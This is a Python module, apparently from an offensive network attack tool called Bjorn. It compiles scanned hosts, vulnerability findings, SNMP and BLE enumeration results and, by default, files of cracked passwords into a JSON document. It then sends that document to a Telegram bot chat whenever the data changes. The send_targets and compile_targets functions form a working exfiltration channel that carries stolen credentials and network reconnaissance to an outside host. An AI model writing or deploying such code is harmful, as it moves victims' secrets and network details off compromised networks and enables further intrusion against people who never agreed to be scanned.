# telegram_client.py
# Telegram delivery for Bjorn reports (backlog Wave 2). Stdlib urllib only -- no new dependency.
# Sends the *raw target dataset* (netkb + findings) as a JSON document so an AI agent can compile a
# report later, and only when the data has actually changed since the last send (delta detection).
# Kept dependency-free and separate from shared.py so both the standalone action and the web handler
# can call send_targets(), and the pure helpers are unit-testable without SharedData.
import os
import csv
import json
import time
import uuid
import hashlib
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

_API = "https://api.telegram.org/bot{token}/{method}"


def _api_url(token, method):
    return _API.format(token=token, method=method)


def _do(req, timeout=20):
    """Run a Telegram API request, return (ok, detail)."""
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            obj = json.loads(resp.read().decode("utf-8", errors="replace"))
        return (True, "sent") if obj.get("ok") else (False, obj.get("description", "telegram error"))
    except urllib.error.HTTPError as e:
        return (False, f"HTTP {e.code}: {e.read().decode('utf-8', errors='replace')[:200]}")
    except Exception as e:
        return (False, str(e))


def send_message(token, chat_id, text):
    """Plain-text message (no parse_mode -> no MarkdownV2 escaping to worry about)."""
    data = urllib.parse.urlencode({"chat_id": chat_id, "text": text}).encode()
    return _do(urllib.request.Request(_api_url(token, "sendMessage"), data=data))


def _multipart_encode(fields, filename, content):
    """Build a multipart/form-data body for sendDocument. Pure/testable. `content` is bytes."""
    boundary = "----BjornBoundary" + uuid.uuid4().hex
    parts = []
    for k, v in fields.items():
        parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'
                     .encode("utf-8"))
    parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="document"; '
                 f'filename="{filename}"\r\nContent-Type: application/json\r\n\r\n'.encode("utf-8"))
    parts.append(content if isinstance(content, bytes) else content.encode("utf-8"))
    parts.append(f"\r\n--{boundary}--\r\n".encode("utf-8"))
    return b"".join(parts), f"multipart/form-data; boundary={boundary}"


def send_document(token, chat_id, filename, content_bytes, caption=""):
    body, ctype = _multipart_encode({"chat_id": chat_id, "caption": caption}, filename, content_bytes)
    req = urllib.request.Request(_api_url(token, "sendDocument"), data=body,
                                 headers={"Content-Type": ctype})
    return _do(req)


# --- raw target dataset -------------------------------------------------------------------
def _read_csv(path):
    try:
        with open(path, newline="") as f:
            return list(csv.DictReader(f))
    except FileNotFoundError:
        return []


def _collect_creds(crackedpwddir):
    out = {}
    try:
        for name in sorted(os.listdir(crackedpwddir)):
            if name.endswith(".csv"):
                out[name] = _read_csv(os.path.join(crackedpwddir, name))
    except FileNotFoundError:
        pass
    return out


def compile_targets(shared_data, include_creds=True):
    """Assemble the raw target dataset from the CSVs already on disk (netkb + findings). No
    generated_at here, so the signature is stable when nothing changed."""
    sr = shared_data.scan_results_dir
    data = {
        "hosts": _read_csv(shared_data.netkbfile),
        "http_fingerprints": _read_csv(os.path.join(sr, "http_fingerprints.csv")),
        "web_findings": _read_csv(os.path.join(sr, "web_template_findings.csv")),
        "snmp": _read_csv(os.path.join(sr, "snmp_enum.csv")),
        "ble": _read_csv(os.path.join(sr, "ble_devices.csv")),
        "vulnerabilities": _read_csv(shared_data.vuln_summary_file),
    }
    if include_creds:
        data["credentials"] = _collect_creds(shared_data.crackedpwddir)
    return data


def _signature(data):
    return hashlib.sha256(json.dumps(data, sort_keys=True, default=str).encode("utf-8")).hexdigest()


def _load_json(path):
    try:
        with open(path) as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


def _save_json(path, obj):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(obj, f)


def send_targets(shared_data, force=False):
    """Compile the raw target dataset and send it as a JSON document — but only when it changed
    since the last send (unless force). Returns (ok, detail, sent). Network errors leave the stored
    signature untouched so the next cycle retries when back online."""
    token = (getattr(shared_data, "telegram_bot_token", "") or "").strip()
    chat = (getattr(shared_data, "telegram_chat_id", "") or "").strip()
    if not token or not chat:
        return (False, "bot token / chat id not set", False)

    data = compile_targets(shared_data, getattr(shared_data, "telegram_include_creds", True))
    sig = _signature(data)
    state_path = os.path.join(shared_data.datadir, "telegram_state.json")
    state = _load_json(state_path)
    now = time.time()
    if not force:
        if sig == state.get("hash"):
            return (True, "no change since last send", False)
        if now - state.get("ts", 0) < getattr(shared_data, "telegram_min_interval", 300):
            return (True, "rate-limited (min interval not elapsed)", False)

    payload = json.dumps(
        {"generated_at": datetime.now(timezone.utc).isoformat(), "targets": data},
        indent=2, default=str).encode("utf-8")
    ts = time.strftime("%Y%m%d_%H%M%S")
    ok, detail = send_document(token, chat, f"bjorn_targets_{ts}.json", payload, "Bjorn target data")
    if ok:
        _save_json(state_path, {"hash": sig, "ts": now})
    return (ok, detail, True)
